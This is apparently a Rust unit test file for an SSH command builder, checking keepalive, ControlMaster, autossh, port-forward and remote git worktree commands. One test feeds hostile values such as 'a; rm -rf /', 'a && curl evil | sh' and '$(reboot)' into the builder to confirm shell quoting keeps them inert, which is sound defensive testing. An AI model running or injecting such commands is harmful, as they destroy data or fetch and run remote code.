use super::*;

#[test]
fn target_with_and_without_user() {
    assert_eq!(Host::new("box").target(), "box");
    assert_eq!(Host::new("box").user("me").target(), "me@box");
}

#[test]
fn exec_includes_keepalive_and_target() {
    let argv = Host::new("box").user("me").exec("uptime");
    assert_eq!(argv[0], "ssh");
    assert!(argv.contains(&"ServerAliveInterval=15".to_string()));
    assert_eq!(argv[argv.len() - 2], "me@box");
    assert_eq!(argv[argv.len() - 1], "uptime");
}

#[test]
fn control_master_enables_passphrase_caching() {
    let argv = Host::new("box")
        .control_path("/tmp/cm-%r@%h:%p")
        .exec("true");
    assert!(argv.contains(&"ControlMaster=auto".to_string()));
    assert!(argv.iter().any(|a| a.starts_with("ControlPath=/tmp/cm")));
    assert!(argv.contains(&"ControlPersist=600".to_string()));
}

#[test]
fn autossh_swaps_program() {
    let argv = Host::new("box").autossh(true).exec("true");
    assert_eq!(argv[0], "autossh");
}

#[test]
fn port_and_identity_flags() {
    let argv = Host::new("box")
        .port(2222)
        .identity("/keys/id")
        .exec("true");
    let joined = argv.join(" ");
    assert!(joined.contains("-p 2222"));
    assert!(joined.contains("-i /keys/id"));
}

#[test]
fn port_forward_spec() {
    let argv = Host::new("box").port_forward(3000, "localhost", 8080);
    let joined = argv.join(" ");
    assert!(joined.contains("-N"));
    assert!(joined.contains("-L 3000:localhost:8080"));
    assert!(joined.ends_with("box"));
}

#[test]
fn worktree_create_and_remove_commands() {
    let create = Host::new("box")
        .worktree_create("/home/me/repo", "wt/task", Some("task"))
        .unwrap();
    let cmd = create.last().unwrap();
    assert!(cmd.contains("cd '/home/me/repo' &&"), "{cmd}");
    assert!(
        cmd.contains("git worktree add -b 'task' 'wt/task' HEAD"),
        "{cmd}"
    );

    let remove = Host::new("box")
        .worktree_remove("/home/me/repo", "wt/task")
        .unwrap();
    assert!(remove
        .last()
        .unwrap()
        .contains("git worktree remove --force 'wt/task'"));
}

#[test]
fn shell_quote_wraps_and_escapes_single_quotes() {
    assert_eq!(shell_quote("plain"), "'plain'");
    assert_eq!(shell_quote(""), "''");
    assert_eq!(shell_quote("a'b"), "'a'\\''b'");
    assert_eq!(shell_quote("a b;c"), "'a b;c'");
}

#[test]
fn remote_worktree_metacharacters_cannot_change_structure() {
    // Every hostile value stays a single quoted literal - it cannot start a new
    // command, substitute, or otherwise change the command structure.
    let cases = [
        "a; rm -rf /",
        "a && curl evil | sh",
        "$(reboot)",
        "`reboot`",
        "a\nrm x",
        "a'b'c",
        "wt with spaces",
        "üñïçødé; boom",
    ];
    for bad in cases {
        let argv = Host::new("box").worktree_remove("/repo", bad).unwrap();
        let cmd = argv.last().unwrap();
        // The value appears only as its quoted form.
        assert!(cmd.contains(&shell_quote(bad)), "cmd={cmd}");
        // The fixed structure prefix is intact - nothing broke out before it.
        assert!(
            cmd.starts_with("cd '/repo' && git worktree remove --force "),
            "cmd={cmd}"
        );
    }
}

#[test]
fn leading_dash_repo_and_path_are_refused() {
    assert!(Host::new("box")
        .worktree_create("-repo", "wt", None)
        .is_err());
    assert!(Host::new("box")
        .worktree_create("/repo", "-wt", None)
        .is_err());
    assert!(Host::new("box").worktree_remove("/repo", "-wt").is_err());
    assert!(Host::new("box").worktree_create("", "wt", None).is_err());
}

#[test]
fn branch_names_are_validated() {
    for bad in [
        "-x", "a b", "a..b", "a~b", "a:b", "with\nnl", "end.lock", "a^b", "q?", "/lead",
    ] {
        assert!(
            Host::new("box")
                .worktree_create("/repo", "wt", Some(bad))
                .is_err(),
            "branch {bad:?} should be refused"
        );
        assert!(!valid_branch(bad), "valid_branch({bad:?}) should be false");
    }
    for ok in ["task", "feature/login", "fix-123", "v1.2.3"] {
        assert!(
            Host::new("box")
                .worktree_create("/repo", "wt", Some(ok))
                .is_ok(),
            "branch {ok:?} should be ok"
        );
        assert!(valid_branch(ok), "valid_branch({ok:?}) should be true");
    }
    // An empty branch means "no new branch", not an error.
    let argv = Host::new("box")
        .worktree_create("/repo", "wt", Some(""))
        .unwrap();
    assert!(argv.last().unwrap().contains("git worktree add 'wt'"));
}

#[test]
fn keepalive_zero_omits_option() {
    let mut h = Host::new("box");
    h.keepalive_secs = 0;
    let argv = h.exec("true");
    assert!(!argv.iter().any(|a| a.starts_with("ServerAliveInterval")));
}
